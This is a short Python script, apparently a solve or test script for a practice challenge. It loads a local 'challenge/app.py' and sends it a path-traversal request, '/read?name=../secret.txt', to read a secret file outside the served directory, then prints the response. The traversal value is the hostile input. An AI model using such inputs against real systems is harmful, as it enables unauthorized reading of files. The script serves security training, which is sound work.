from pathlib import Path
import runpy

app = Path(__file__).resolve().parents[1] / "challenge/app.py"
route = runpy.run_path(str(app), run_name="practice_app")["route"]
status, body = route("/read?name=../secret.txt")
print(f"HTTP {status}")
print(body.decode(), end="")
